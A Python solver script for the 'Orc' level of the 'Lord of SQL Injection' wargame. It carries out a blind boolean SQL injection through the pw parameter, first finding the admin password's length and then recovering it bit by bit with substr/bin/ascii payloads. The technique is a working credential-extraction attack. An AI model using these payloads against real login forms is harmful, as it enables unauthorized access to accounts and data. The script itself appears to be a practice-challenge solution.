import requests

query = 0
print("#### Lord of SQL Injection - Orc ####\n")

url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"

# session = "gequo9hff2f19sjmieftjnuf50"
session = "cugbofvimauocov1l1f7f57kho"

headers = {
    'Cookie': 'PHPSESSID={0}'.format(session)
}

password = ""

# get the length of password
for i in range(100):
    param = "?pw=' or id='admin' and length(pw)={0}%23".format(i)

    content = requests.get(url + param, headers=headers).text
    query += 1

    if "Hello admin" in content:
        length = i
        print("[*] The length of admin password :", i)
        break


print("\n\n#### Starting Blind SQL Injection ####\n")
#  substr(lpad(bin(ascii(substr('asdf',1,1))),7,0),1,1)

print("[*] the password : ")

for i in range(1, length+1):
    binary = ''
    for j in range(0, 8):
        param = "?pw=' or id='admin' and (select substr(lpad(bin(ascii(substr(pw,{0},1))),7,0),{1},1)=1)%23".format(i, j)
        content = requests.get(url + param, headers=headers).text
        query += 1

        if "Hello admin" in content:
            binary += '1'
        else:
            binary += '0'

    password += chr(int(binary, 2))
    print(chr(int(binary, 2)), end='')

print("\n[*] the password :", password)

url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw={0}".format(password)
content = requests.get(url + param, headers=headers).content

if "<h2>ORC Clear!</h2>" in str(content):
    print("ORC Clear!")

print("[+] total query :", query)
